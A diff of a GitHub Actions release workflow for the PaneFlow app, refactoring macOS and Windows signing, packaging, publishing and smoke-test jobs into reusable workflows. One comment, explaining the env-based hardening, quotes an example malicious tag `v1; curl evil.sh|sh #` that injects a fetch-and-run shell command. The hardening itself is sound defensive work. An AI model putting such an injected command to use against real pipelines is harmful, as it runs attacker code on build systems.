-        # must not fail the entire leg - the release engineer still
-        # wants the un-notarized .app + the Linux/Windows artifacts to
-        # land in the workflow artifact bundle for inspection. In
-        # tag-push mode this stays hard-required: shipping an
-        # un-notarized .dmg under v0.X.Y would block first-launch on
-        # every macOS user's box.
-        continue-on-error: ${{ env.RELEASE_MODE == 'dry-run' }}
-        env:
-          APPLE_ID: ${{ secrets.APPLE_ID }}
-          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
-          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
-        run: bash scripts/notarize-macos.sh dist/PaneFlow.app
-
-      - name: Record unsigned macOS build in job summary
-        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available != 'true'
-        env:
-          ARCH: ${{ matrix.arch }}
-          TAG: ${{ env.RELEASE_TAG }}
-        run: scripts/summarize-unsigned-macos.sh "$ARCH" "$TAG"
-
-      # ─── Free disk space before .dmg ─────────────────────────────────
-      # macos-15 hosted runners ship with ~14 GB free. A workspace-wide
-      # `cargo build --release` for the GPUI graph routinely consumes
-      # 11-13 GB of `target/` (Zed monorepo deps, libghostty,
-      # gpui_macos with Metal shaders, all release-mode codegen). By the
-      # time we reach `Produce .dmg`, the runner has <100 MB free, and
-      # `hdiutil create` aborts with `No space left on device` while
-      # asking for a 75 MB staging image (observed in v0.2.9-rc.1).
-      #
-      # `target/` is disposable here: the release binary was already
-      # copied into `dist/PaneFlow.app/Contents/MacOS/paneflow` by
-      # `bundle-macos.sh`, signed by `sign-macos.sh`, and stapled by
-      # `notarize-macos.sh`. Nothing downstream in this leg reads
-      # `target/`. `df -h` brackets give us the disk delta in the CI log
-      # for future capacity-planning. Linux/Windows legs skip via the
-      # `runner.os == 'macOS'` guard.
-      - name: Free disk space before .dmg packaging
-        if: runner.os == 'macOS'
-        run: |
-          set -euo pipefail
-          echo "::group::Disk space before cleanup"
-          df -h /
-          du -sh target/ 2>/dev/null || true
-          echo "::endgroup::"
-          rm -rf target/
-          echo "::group::Disk space after cleanup"
-          df -h /
-          echo "::endgroup::"
-
-      # ─── US-016 .dmg assembly ────────────────────────────────────────
-      # Wraps the stapled .app in a drag-to-Applications .dmg. Zero new
-      # dependencies - hdiutil + osascript are built into macOS. Runs
-      # *after* notarization so the enclosed bundle already carries its
-      # Apple-issued stapled ticket.
-      #
-      # US-023 AC7 (publish-safety guard): `.dmg` production and staging
-      # are gated on `steps.macos_signing.outputs.signing_available`. An
-      # unsigned `.app` MUST NOT reach the published GitHub Release -
-      # users would hit Gatekeeper "can't be opened" with no in-band
-      # signal that the asset was published unsigned. When secrets are
-      # absent the leg leaves the unsigned `.app` in `dist/` for local
-      # inspection, prints the warning banner from the previous step, and
-      # produces no release asset.
-      #
-      # The output filename `paneflow-<tag>-<arch>-apple-darwin.dmg` is
-      # chosen to match US-008's `update/checker.rs::pick_asset`; any
-      # other shape would silently break the in-app update prompt for
-      # macOS users.
-      - name: Produce .dmg
-        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-          ARCH: ${{ matrix.arch }}
-        run: bash scripts/create-dmg.sh --version "${TAG#v}" --arch "$ARCH"
-
-      # Stage the .dmg + SHA-256 sibling into release-assets/ so the
-      # downstream `release` job picks it up alongside the Linux-leg
-      # artifacts. Mirrors the sha256 pattern used by the tar.gz step.
-      # Linux legs skip this entirely; US-019 adds the macos-15 matrix
-      # leg that activates it. US-023: gated on signing_available so
-      # unsigned legs produce no release asset.
-      - name: Stage macOS .dmg
-        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-          ARCH: ${{ matrix.arch }}
-        run: scripts/stage-macos-assets.sh "${TAG#v}" "$ARCH"
-
-      # ─── US-016 Windows MSI: toolchain preflight ─────────────────────────
-      # Gated on `windows_signing.signing_available` (set above): when the
-      # Azure secrets aren't populated yet, we don't bother with WiX or
-      # cargo-wix at all - the build/test/clippy validation above is what
-      # we need for cross-platform coverage. Once the secrets land, this
-      # whole chain re-activates without any other workflow change.
-      #
-      # windows-2022 preinstalls WiX 3.14.1.8722. signtool.exe lives in
-      # the Windows 10/11 SDK but is NOT resolved here: sign-windows.ps1
-      # does its own SDK scan (defense in depth - if the runner image
-      # ever drops it, the script's clear error is better than a silent
-      # PATH mismatch between this step and the script). Preflight only
-      # handles WiX because cargo-wix errors are cryptic otherwise.
-      - name: Preflight WiX v3 toolchain
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        run: ./scripts/preflight-wix.ps1
-
-      # cargo-wix itself is NOT preinstalled on windows-2022. Pinned to
-      # 0.3.9 (latest 2025-03 release; no 0.4.x exists yet that supports
-      # WiX v4 - tracked upstream as volks73/cargo-wix#202). The release
-      # runs without a cache, so this compiles for about 2 min.
-      - name: Install cargo-wix (pinned)
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        run: |
-          cargo install cargo-wix --version 0.3.9 --locked
-          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
-
-      - name: Validate WiX per-machine invariants
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        run: ./scripts/check-wix-per-machine.ps1
-
-      # ─── Windows Authenticode: sign the installed executable first ───────
-      # Smart App Control evaluates the installed application binary, not just
-      # the container MSI. WiX embeds this exact release binary, so sign it
-      # before `cargo wix --no-build` packages it into Program Files.
-      - name: Sign Windows executable
-        id: sign_windows_exe
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
-          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
-          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
-        run: ./scripts/sign-windows-executables.ps1
-
-      - name: Verify Windows libghostty release payload
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          TARGET: ${{ matrix.target }}
-        run: ./scripts/verify-windows-release-payload.ps1 -Target $env:TARGET
-
-      # ─── US-016 AC-1: Produce MSI ────────────────────────────────────────
-      # cargo-wix reads [package.metadata.wix] in src-app/Cargo.toml (US-013)
-      # and `packaging/wix/main.wxs` to drive candle → light. The
-      # `--install-version` flag overrides the MSI's ProductVersion with
-      # the bare semver (no leading `v`) - required because WiX's
-      # ProductVersion schema rejects `v0.1.7` and accepts only `0.1.7`.
-      #
-      # Output: `target/wix/paneflow-<ver>-x86_64.msi`. The `--target`
-      # flag tells cargo-wix which already-signed release binary to pick up
-      # (`target/x86_64-pc-windows-msvc/release/paneflow.exe`) but the
-      # installer output directory is always `target/wix/` regardless -
-      # do NOT assume the triple folder.
-      - name: Produce MSI
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          MSI_VERSION: ${{ env.WINDOWS_MSI_VERSION }}
-        run: ./scripts/build-msi.ps1 -Version $env:MSI_VERSION
-
-      # ─── US-016 AC-2 / US-024 AC-1+AC-3: Sign MSI via Azure Trusted Signing ───
-      # Invokes the US-015 script, which fetches the
-      # `Microsoft.ArtifactSigning.Client` NuGet (pinned 1.0.128) into a
-      # temp dir, writes a metadata.json with ExcludeCredentials, and
-      # calls `signtool.exe sign` with the 3-host timestamp retry chain
-      # (acs.microsoft.com → digicert → sectigo) - satisfying US-024 AC-3.
-      # Verification (`signtool verify /pa` + `Get-AuthenticodeSignature`)
-      # is embedded in the script; an additional standalone verify step
-      # below makes it visible at the workflow level (AC-6).
-      #
-      # Why script-not-action (US-024 AC-1 reconciliation): the official
-      # `azure/trusted-signing-action` is a thin wrapper around the same
-      # `Microsoft.ArtifactSigning.Client` NuGet, but accepts only ONE
-      # `timestamp-rfc3161` URL - it cannot satisfy AC-3's 3-server
-      # fallback chain. The script invokes the same official Microsoft
-      # client at a lower level (signtool /dlib), and is therefore the
-      # canonical Azure Trusted Signing integration here. See
-      # `docs/release/windows-signing.md §"Why a script and not the
-      # official action"` for the full rationale.
-      #
-      # Secrets (all 6 required - populated per US-014 onboarding):
-      #   AZURE_TENANT_ID / AZURE_CLIENT_ID / AZURE_CLIENT_SECRET
-      #       - service principal for EnvironmentCredential auth
-      #   AZURE_TRUSTED_SIGNING_ENDPOINT / _ACCOUNT / _CERT_PROFILE
-      #       - addressing for the code-signing account / cert profile
-      #
-      # AC-5: when `signing_available` is false the Windows leg still
-      # builds, tests, and lints, but skips MSI packaging/signing/staging.
-      # The banner step below records that no Windows installer was
-      # published. We do not ship unsigned Windows installers.
-      - name: Sign MSI
-        id: sign_msi
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
-          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
-          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
-          TAG: ${{ env.RELEASE_TAG }}
-        run: ./scripts/sign-msi.ps1 -Tag $env:TAG
-
-      # ─── US-024 AC-6: Verify MSI signature at workflow level ─────────────
-      # `sign-windows.ps1` already runs `signtool verify /pa /v` + an
-      # `Get-AuthenticodeSignature` Authenticode check internally - this
-      # step re-runs the bare `signtool verify /pa /v` so the verification
-      # output is unambiguously visible at the workflow level (the
-      # script's verify is buried inside its log section). AC-6 demands
-      # the literal "Successfully verified" string; we grep for it and
-      # fail the step if absent.
-      # Explicit `steps.sign_msi.outcome == 'success'` guard alongside the
-      # implicit `success()` default: belt-and-braces against a future
-      # editor adding `continue-on-error: true` to the Sign MSI step,
-      # which would let `success()` evaluate true after a sign failure
-      # and run Verify against an unsigned artifact.
-      - name: Verify MSI signature
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true' && steps.sign_msi.outcome == 'success'
-        shell: pwsh
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-        run: ./scripts/verify-msi-signature.ps1 -Tag $env:TAG
-
-      # Every executable the MSI installs, and the MSI itself, must carry a
-      # valid Authenticode signature before anything is uploaded. The embedded
-      # helpers are checked at the copies rust-embed ingested, and every shim
-      # copy is checked where WiX picks it up.
-      - name: Verify Windows Authenticode signatures
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          TARGET: ${{ matrix.target }}
-        run: ./scripts/verify-windows-authenticode.ps1 -Target $env:TARGET
-
-      # ─── Record skipped Windows MSI packaging in job summary ────────────
-      # When the Azure secrets aren't populated, the entire MSI chain
-      # (Preflight WiX → Install cargo-wix → Produce MSI → Sign → Verify
-      # → Stage) is gated off. The leg still builds the Windows release
-      # binary, but produces no .msi artifact. This banner makes that
-      # visible in the run
-      # summary so a release reviewer doesn't wonder where the MSI went.
-      - name: Record skipped Windows MSI packaging in job summary
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available != 'true'
-        shell: bash
-        env:
-          ARCH: ${{ matrix.arch }}
-          TAG: ${{ env.RELEASE_TAG }}
-        run: scripts/summarize-skipped-msi.sh "$ARCH" "$TAG"
-
-      # ─── US-016 AC-3: Stage the signed MSI + SHA-256 sidecar ─────────────
-      # Rename from cargo-wix's default (paneflow-<ver>-x86_64.msi) to the
-      # canonical release asset name paneflow-<ver>-x86_64-pc-windows-msvc.msi
-      # that `update::checker::pick_asset` (US-011) matches against. The
-      # `-pc-windows-msvc` suffix is the Rust triple, kept in the filename
-      # so the in-app updater's asset picker can key on the triple without
-      # an explicit per-OS branch.
-      #
-      # Same env-routing hardening as the Linux/macOS stage steps: `TAG`
-      # goes via the `env:` block, never inlined as `${{ ... }}` inside
-      # the shell body - so an attacker-controlled tag cannot shell-inject.
-      - name: Stage Windows assets
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: bash
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-        run: scripts/stage-windows-assets.sh "${TAG#v}"
-
-      # --- Stage all 4 artifacts with canonical names ---
-      # Linux-leg-only: the macOS .dmg is staged by its own step above.
-      # Context values are passed via `env:` rather than inlined as
-      # `${{ github.ref_name }}` inside the shell body - otherwise an
-      # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
-      # shell-injected when bash parses the script. `env:` injects them
-      # as environment variables, immune to shell interpretation.
-      - name: Stage release assets
-        if: runner.os == 'Linux'
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-          ARCH: ${{ matrix.arch }}
-          TARGET: ${{ matrix.target }}
-        # `VERSION="${TAG#v}"` strips the leading `v` so all Linux assets
-        # are named `paneflow-<semver>-<arch>.<ext>` (no `v` prefix),
-        # aligning with the macOS DMG and Windows MSI naming conventions
-        # already in this workflow. The invariant we MUST preserve is the
-        # filename suffix `-<arch>.<ext>`. That's what
-        # `update/checker.rs::pick_asset` matches on
-        # (`a.name.to_ascii_lowercase().ends_with("-x86_64.deb")` etc.),
-        # so dropping the `v` from the prefix is safe for v0.2.x clients
-        # auto-updating to v0.3.0+.
-        run: scripts/stage-linux-assets.sh "${TAG#v}" "$ARCH" "$TARGET"
-
-      # Upload artifacts so the smoke-test jobs below can install them
-      # in clean Ubuntu / Fedora containers. `compression-level: 0`
-      # - artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
-      - name: Verify release artifacts staged
-        run: scripts/check-staged-assets.sh
-
-      - name: Upload release artifacts (for smoke-test jobs)
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
-        with:
-          # US-019: include runner.os in the artifact name because Linux
-          # aarch64 and macOS aarch64 would otherwise collide on
-          # `release-assets-aarch64`. The publish + smoke jobs glob
-          # `release-assets-*`, so the new pattern is compatible.
-          name: release-assets-${{ matrix.arch }}-${{ runner.os }}
-          path: release-assets/
-          retention-days: 7
-          compression-level: 0
-
-  # US-019: macOS aarch64 (Apple Silicon). Native build on GitHub-hosted
-  # macos-15, through the bundle, sign, notarize and .dmg steps. Hard-required
-  # since 2026-05-27: a `continue-on-error` leg hid a notarization-staple
-  # regression behind a green run.
-  build-macos:
-    name: Build ${{ matrix.target }}
+  macos:
+    name: macOS
     needs: preflight
-    runs-on: ${{ matrix.runs-on }}
-    timeout-minutes: 100
-    environment: ${{ ((github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')) && 'release' || '' }}
-    strategy:
-      matrix:
-        include:
-          - target: aarch64-apple-darwin
-            arch: aarch64
-            runs-on: macos-15
-    steps: *build_steps
+    uses: ./.github/workflows/release-macos.yml
+    with:
+      sha: ${{ needs.preflight.outputs.sha }}
+      tag: ${{ needs.preflight.outputs.tag }}
+      mode: ${{ needs.preflight.outputs.mode }}
+      signed: ${{ needs.preflight.outputs.signed == 'true' }}
+    secrets:
+      POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+      APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
+      APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
+      APPLE_ID: ${{ secrets.APPLE_ID }}
+      APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
+      APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
 
-  # x86_64-pc-windows-msvc, signed through Azure Artifact Signing.
-  # Hard-required since 2026-06-26: Windows is a release target, so any
-  # Windows build, signing, packaging, or staging failure fails the workflow.
-  build-windows:
-    name: Build ${{ matrix.target }}
+  windows:
+    name: Windows
     needs: preflight
-    runs-on: ${{ matrix.runs-on }}
-    timeout-minutes: 50
-    environment: ${{ ((github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')) && 'release' || '' }}
-    strategy:
-      matrix:
-        include:
-          - target: x86_64-pc-windows-msvc
-            arch: x86_64
-            runs-on: windows-2022
-    steps: *build_steps
+    uses: ./.github/workflows/release-windows.yml
+    with:
+      sha: ${{ needs.preflight.outputs.sha }}
+      tag: ${{ needs.preflight.outputs.tag }}
+      mode: ${{ needs.preflight.outputs.mode }}
+      msi_version: ${{ needs.preflight.outputs.msi_version }}
+      signed: ${{ needs.preflight.outputs.signed == 'true' }}
+    secrets:
+      POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+      AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+      AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+      AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+      AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
+      AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
+      AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
 
-  # ─── Unified release publish ────────────────────────────────────────
-  # The build runs as four legs across three jobs. Calling
-  # softprops/action-gh-release from each matrix leg would race two
-  # concurrent API writers against the same tag: two "create release"
-  # calls, two `generate_release_notes: true` bodies, overlapping
-  # asset uploads. Instead, every matrix leg only uploads its
-  # `release-assets-<arch>` workflow artifact; this single job runs
-  # after ALL legs finish, downloads every artifact, and creates the
-  # GitHub Release exactly once with the merged file set.
-  #
-  # Atomic-release guarantee (PRD AC6): the publish job `needs:` list
-  # waits for `ci-verdict`, the three build jobs and every release smoke
-  # gate. A red or skipped required `run_tests` job on the release commit,
-  # or a failed Linux x64, Linux aarch64, macOS aarch64, Windows x64,
-  # package smoke, MSI smoke, MSI upgrade over a live host, or auto-update
-  # E2E blocks publishing.
-  release:
-    name: Publish GitHub Release
-    # US-003: skip the entire publish chain in dry-run mode. The
-    # the downstream `update_cask.yml` workflow is triggered by workflow_run
-    # and now requires a successful release workflow, so skipping/failing this
-    # job transitively skips it. `repo_publish.yml` is
-    # triggered by `workflow_run` of this workflow but already filters on
-    # `workflow_run.event == 'push'` (line ~94 of repo_publish.yml),
-    # so a workflow_dispatch run never touches pkg.paneflow.dev.
-    # NOTE: GitHub Actions does NOT expose the `env` context in job-level
-    # `if:` expressions (only in step-level `if:`, in `with:`/`env:` of
-    # steps, and in `continue-on-error:`). Use `github.event_name` +
-    # `github.ref` directly. The `startsWith(...)` belt is required even
-    # though the workflow's only `push` trigger is `tags: ["v*"]` -
-    # without it, any future addition of a `push: branches:` trigger
-    # (e.g. for nightly artifacts) would silently start publishing real
-    # GitHub Releases off branch pushes. Defence in depth, mirrors the
-    # canonical pattern used by rust-lang/rust, tokio-rs/tokio, and Zed
-    # (zed-industries/zed .github/workflows/release.yml).
-    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
-    # US-002: Publish is gated on every release validation job, not just
-    # the builds. If any smoke test fails, the GitHub Release must not publish.
-    # US-005: also gated on `auto-update-e2e` so a tag cut never ships a
-    # binary that can't actually self-update v(N-1) → v(N).
-    # Pre-US-002 the smoke jobs ran in parallel with publish (rationale:
-    # the .deb/.rpm hadn't been signed yet, so a hot-fix re-publish was
-    # cheaper than blocking the tag). Post-v0.2.11 the macOS DMG is
-    # notarized and the Windows MSI is in the Azure-signing pipeline,
-    # so a botched-postinst hot-fix means re-running the entire signing
-    # chain. Blocking publish on every smoke gate is the cheaper and more
-    # honest failure mode now. `dry-run-summary` is intentionally excluded:
-    # it only runs for workflow_dispatch dry-runs, never for tag-push
-    # release publishing.
-    needs:
-      - preflight
-      - ci-verdict
-      - build-linux
-      - build-macos
-      - build-windows
-      - smoke-linux
-      - smoke-test-windows-msi
-      - smoke-test-windows-msi-live-host
-      - auto-update-e2e
-    runs-on: ubuntu-24.04
-    timeout-minutes: 10
-    # US-002 (prd-audit-remediation): gate the publish job (which holds the
-    # minisign signing key) behind the `release` environment, so the private
-    # key can be an *environment* secret with optional required-reviewer
-    # protection rather than a bare repo secret. GitHub auto-creates the
-    # environment unprotected on first run; add reviewers in repo settings to
-    # require manual approval before a tag is signed + published.
-    environment: release
-    permissions:
-      contents: write
-      # actions/attest-build-provenance signs the provenance with this job's
-      # OIDC identity and stores it on the repository.
-      id-token: write
-      attestations: write
-    steps:
-      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
-        with:
-          ref: ${{ needs.preflight.outputs.sha }}
-          persist-credentials: false
-
-      # AGENTS.md re-creates a tag at the fix commit when a tag build fails.
-      # A run still in flight for the old commit must not publish its
-      # binaries under a tag that now names another commit.
-      - name: Require the tag to still point at the built commit
-        env:
-          RELEASE_SHA: ${{ needs.preflight.outputs.sha }}
-        run: scripts/require-tag-at-commit.sh "$RELEASE_TAG" "$RELEASE_SHA"
-
-      # A published release is final: a re-run fails here instead of
-      # replacing its assets, and the fix ships as a patch version. A draft
-      # left by an earlier attempt is still replaced.
-      - name: Refuse a release that is already published
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: bash scripts/require-unpublished-release.sh "$RELEASE_TAG"
-
-      - name: Download all release artifacts
-        # `pattern` globs every `release-assets-*` workflow artifact
-        # (x86_64 + aarch64 today, more later). `merge-multiple: true`
-        # flattens them into a single directory so `files: release-assets/*`
-        # picks up every built asset.
-        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
-        with:
-          path: release-assets
-          pattern: release-assets-*
-          merge-multiple: true
-
-      - name: Verify merged release artifacts
-        run: |
-          set -euo pipefail
-          if [ ! -d release-assets ] || ! find release-assets -maxdepth 1 -type f | grep -q .; then
-            echo "::error::No release artifacts were downloaded. Refusing to create an empty GitHub Release."
-            exit 1
-          fi
-
-      # US-002: sign every shipped artifact with the project minisign key so
-      # clients can verify downloads against the public key baked into their
-      # binary (update/signature.rs). The detached `.minisig` siblings are
-      # picked up by `files: release-assets/*` below. Missing key is a hard
-      # release failure: clients with embedded keys verify fail-closed, so an
-      # unsigned release would publish unusable self-update assets.
-      - name: Sign release artifacts (minisign)
-        env:
-          MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
-        run: scripts/sign-release-assets.sh release-assets
-
-      # Draft first: the release stays hidden from /releases/latest, which the
-      # in-app updater reads, until every asset is uploaded, matches the file
-      # this run built, and carries its provenance attestation.
-      - name: Create the draft GitHub Release and upload the assets
-        id: draft
-        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
-        with:
-          files: release-assets/*
-          generate_release_notes: true
-          draft: true
-          prerelease: ${{ contains(env.RELEASE_TAG, 'alpha') || contains(env.RELEASE_TAG, 'beta') || contains(env.RELEASE_TAG, 'rc') }}
-
-      # The `digest` GitHub computed for each uploaded asset must be the
-      # SHA-256 of the file this run built and signed, and the two asset sets
-      # must be equal. On any mismatch the job fails and the draft stays in
-      # place for inspection.
-      - name: Compare every uploaded asset digest with the built file
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          RELEASE_ID: ${{ steps.draft.outputs.id }}
-        run: bash scripts/verify-release-digests.sh "$RELEASE_ID" release-assets
-
-      # SLSA build provenance for every asset, signed with this job's OIDC
-      # identity. Users verify a download with
-      # `gh attestation verify <file> --repo arthjean/paneflow`.
-      - name: Attest the release assets
-        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
-        with:
-          subject-path: release-assets/*
-
-      # With immutable releases enabled on the repository, publishing locks
-      # the tag and every asset from here on.
-      - name: Publish the verified and attested release
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          GH_REPO: ${{ github.repository }}
-        run: |
-          set -euo pipefail
-          gh release edit "${RELEASE_TAG}" --draft=false
-
-  # ─── Linux package smokes ───────────────────────────────────────────
-  # Each leg installs the x86_64 package the way its distribution does, in
-  # a bare container, through `scripts/smoke-linux-package.sh`:
-  #   - Ubuntu 22.04         .deb postinst, paneflow.list, idempotency, and
-  #                          `paneflow --version` on the glibc 2.35 floor
-  #   - Fedora 40            .rpm %post, paneflow.repo, idempotency
-  #   - Debian 12 bookworm   .deb install + paneflow --version
-  #   - openSUSE Tumbleweed  .rpm install via zypper + paneflow --version
-  #   - Arch Linux           tar.gz + paneflow and paneflow-host --version
-  # Arch installs the tarball because Paneflow has no PKGBUILD; it still
-  # proves that a binary built for glibc 2.35 loads on a rolling
-  # distribution's libxcb, libxkbcommon and libvulkan. The legs are
-  # x86_64 only: the scriptlets they exercise are shell, the same on arm64.
-  # `fail-fast: false` keeps every distribution's verdict, and the publish
-  # job needs the whole matrix. The images run the script with bash: dash,
-  # the /bin/sh of Ubuntu and Debian, has no `set -o pipefail`.
+  # Each leg installs the x86_64 package the way its distribution does, in a
+  # bare container, through `scripts/smoke-linux-package.sh`. Ubuntu 22.04
+  # is the glibc 2.35 floor: its leg runs `paneflow --version`. Arch
+  # installs the tarball, there is no PKGBUILD. `fail-fast: false` keeps
+  # every distribution's verdict, and the publish job needs the matrix.
   smoke-linux:
     name: Smoke test - ${{ matrix.name }}
-    needs: build-linux
+    needs: linux
     runs-on: ubuntu-24.04
     timeout-minutes: 10
     container: ${{ matrix.image }}
@@ -1265,162 +262,10 @@ jobs:
           TAG: ${{ env.RELEASE_TAG }}
         run: bash ci-scripts/smoke-linux-package.sh "$DISTRO" "${TAG#v}" release-assets
 
-  # ─── Windows MSI smoke: signed installer + update relay ──────────────
-  # This is the Windows counterpart to the Linux package smokes above.
-  # CI cannot click through a real UAC consent prompt, so the job keeps
-  # the elevated path for manual release smoke. What it does gate here is
-  # the release artifact that users receive: signed MSI integrity, silent
-  # Windows Installer install/uninstall, the installed `paneflow --version`,
-  # and the detached `--msi-relay` path that waits, invokes msiexec, writes
-  # diagnostics, removes its staged MSI, and requests a relaunch.
-  smoke-test-windows-msi:
-    name: Smoke test - Windows MSI install + relay
-    # Only the runs whose build signs (see `build-windows.environment`) produce an MSI.
-    if: (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')
-    needs: [preflight, build-windows]
-    runs-on: windows-2022
-    timeout-minutes: 10
-    defaults:
-      run:
-        shell: pwsh
-    steps:
-      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
-        with:
-          persist-credentials: false
-          ref: ${{ needs.preflight.outputs.sha }}
-      - uses: ./.github/actions/fetch-libghostty
-
-      - name: Download signed Windows MSI
-        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
-        with:
-          name: release-assets-x86_64-Windows
-          path: ./release-assets
-
-      - name: Download pinned v0.8.0 MSI baseline
-        env:
-          GH_TOKEN: ${{ github.token }}
-          BASELINE_DIR: ${{ runner.temp }}\paneflow-msi-baseline
-        run: ./scripts/download-release-msi.ps1 -Tag v0.8.0 -Directory $env:BASELINE_DIR
-
-      - name: Upgrade MSI, verify compliance, and exercise update relay
-        env:
-          TAG: ${{ env.RELEASE_TAG }}
-          MSI_VERSION: ${{ env.WINDOWS_MSI_VERSION }}
-          SMOKE_DIR: ${{ runner.temp }}\paneflow-msi-smoke
-          BASELINE_DIR: ${{ runner.temp }}\paneflow-msi-baseline
-        run: ./scripts/smoke-msi.ps1 -Tag $env:TAG -MsiVersion $env:MSI_VERSION -SmokeDir $env:SMOKE_DIR -BaselineDir $env:BASELINE_DIR
-
-      - name: Record manual Windows backend smoke boundary
-        if: success()
-        run: |
-          @'
-          ## Windows backend release boundary
-
-          CI proved fresh install, a hosted-desktop Ghostty launch, the signed
-          v0.8.0 MSI upgrade, preserved user configuration, static libghostty
-          provenance, installed compliance inventory, updater relay, and clean
-          uninstall. A release reviewer must still execute the full
-          Windows 10 and Windows 11 desktop matrix, including IME, GPU,
-          sleep/resume, non-ASCII profile paths, and conditional RDP.
-          '@ | Add-Content -LiteralPath $env:GITHUB_STEP_SUMMARY
-
-      - name: Upload Windows libghostty smoke provenance
-        if: always()
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
-        with:
-          name: windows-libghostty-smoke-provenance-${{ github.run_id }}
-          path: |
-            ${{ runner.temp }}\paneflow-msi-smoke\*libghostty-provenance.json
-            ${{ runner.temp }}\paneflow-msi-smoke\ghostty-runtime-evidence.json
-          if-no-files-found: warn
-          retention-days: 7
-
-      - name: Upload Windows MSI smoke logs on failure
-        if: failure()
